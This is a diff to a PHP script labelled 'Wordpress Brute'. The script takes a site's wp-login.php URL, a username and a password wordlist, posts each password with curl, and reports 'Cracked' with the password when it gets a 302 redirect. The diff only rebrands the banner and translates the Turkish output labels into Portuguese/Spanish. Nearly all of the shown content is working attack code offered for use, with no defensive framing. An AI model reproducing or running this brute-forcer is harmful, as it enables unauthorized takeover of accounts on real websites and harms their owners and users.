@@ -28,9 +28,8 @@
                *     W     *
                  **     **   
                    *****
-               WORDPRESS-BRUTE
+                  @0zctn
 
-  [+] WORDPRESS-BRUTE
   [+] Wordpress Brute
   [+] Mesela : php wordpress.php site.com/wp-login.php usuario wordlist.txt\n\n
 ";
@@ -39,7 +38,6 @@
 	$host = $argv[1];
 	$user = $argv[2];
 	$pass = file_get_contents($argv[3]);
-
 	$words = explode("\n", $pass);
 	foreach($words as $word){
 		$ch = curl_init();
@@ -53,13 +51,12 @@
 		if(eregi("302", $ver)){
 			print "\n";
 			print "--------------------------------------------------------------------------------------------------------\n";
-			echo "| Cracked : " . "Site : " . " | " . $host . " Kullanıcı : "  . $user . " | " . " Sifre : "  . $word .  "\n";
+			echo "| Cracked: " . "Host: " . " | " . $host . " Usuario: "  . $user . " | " . " Senha: "  . $word .  "\n";
 			print "--------------------------------------------------------------------------------------------------------\n";
 			print "\n";
 			exit;
 		}else{
-			echo "NOT Cracked | " . "Site : " . " | " . $host . " Kullanıcı : "  . $user . " | " . " Sifre : "  . $word .  "\n";
+			echo "NOT Cracked | " . "Host: " . " | " . $host . " Usuario: "  . $user . " | " . " Senha: "  . $word .  "\n";
 		}
 	}
-
 ?>
